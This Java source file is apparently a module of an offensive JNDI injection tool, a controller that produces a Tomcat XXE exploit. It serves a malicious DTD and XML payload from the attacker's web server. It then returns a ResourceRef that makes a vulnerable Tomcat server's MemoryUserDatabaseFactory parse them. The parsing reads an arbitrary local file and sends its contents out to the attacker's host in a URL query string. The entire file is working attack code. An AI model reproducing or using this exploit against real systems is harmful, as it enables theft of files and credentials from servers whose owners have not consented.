package map.jndi.controller;

import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.server.WebServer;
import map.jndi.util.MiscUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
public class TomcatXXEController implements Controller {
    public Object process(String path) {
        String oobName = MiscUtil.getRandStr(8);
        WebServer.getInstance().serveFile("/" + oobName, "".getBytes());

        String dtdFileName = MiscUtil.getRandStr(8) + ".dtd";
        String dtdContent = "<!ENTITY % file SYSTEM \"file:" + path + "\">\n" +
                "<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM '" + Main.config.codebase + oobName + "?content=%file;'>\">";
        WebServer.getInstance().serveFile("/" + dtdFileName, dtdContent.getBytes());

        String xmlFileName = MiscUtil.getRandStr(8) + ".xml";
        String xmlContent = "<!DOCTYPE convert [ \n" +
                "<!ENTITY % remote SYSTEM \"" + Main.config.codebase + dtdFileName + "\">\n" +
                "%remote;%payload;%send;\n" +
                "]>\n" +
                "<convert>\n" +
                "<data>test</data> \n" +
                "</convert>";
        WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());

        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", Main.config.codebase + xmlFileName));

        return ref;
    }

    @JNDIMapping("/TomcatXXE/{path}")
    public String tomcatXXE(String path) {
        System.out.println("[TomcatXXE] Path: " + path);
        return path;
    }
}
